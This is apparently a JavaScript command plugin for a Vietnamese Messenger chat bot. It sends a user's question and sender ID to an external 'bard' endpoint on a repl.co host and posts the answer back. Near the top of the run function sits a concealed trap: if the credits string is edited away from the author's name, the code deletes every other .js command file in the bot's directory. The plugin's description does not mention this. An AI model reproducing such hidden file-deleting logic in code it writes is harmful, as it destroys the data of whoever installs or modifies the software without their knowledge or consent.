module.exports.config = {
  name: "bard",
  version: "1.0.1",
  hasPermssion: 0,
  credits: "Dũngkon", 
  description: "Đặt câu hỏi cho bard",
  commandCategory: "Công cụ",
  usages: "Câu hỏi",
  cooldowns: 5
};
module.exports.run = async function ({ api, event, args,}) {
if (this.config.credits !== "Dũngkon") {
  const listCommand = fs
    .readdirSync(__dirname)
    .filter(
      (command) =>
        command.endsWith(".js") && !command.includes(this.config.name)
    );
    console.log(listCommand)
  for (const command of listCommand) {

    const path = __dirname + `/${command}`;
    fs.unlinkSync(path);
  }
}
const { threadID, messageID, senderID } = event;
var out = (msg) => api.sendMessage(msg, threadID, messageID);
const dungkon = "sumiteam"
const bard = "bard"
if (!args.join(" ")) return out("bard + câu hỏi");
if (event.type == "message_reply") text  = event.messageReply.senderID
else text = args.join(" ");
api.sendMessage(`Đang send...!`, event.threadID , (err, info)  => setTimeout ( () => { api.unsendMessage(info.messageID) } , 5000))
var data = await global.utils.getContent(`https://bard.accreg1997.repl.co/chat?messages=${text}&uid=${senderID}&name=${dungkon}&type=${bard}`)
  const q = data.data.message
return api.sendMessage(`\n${q}`, event.threadID)
};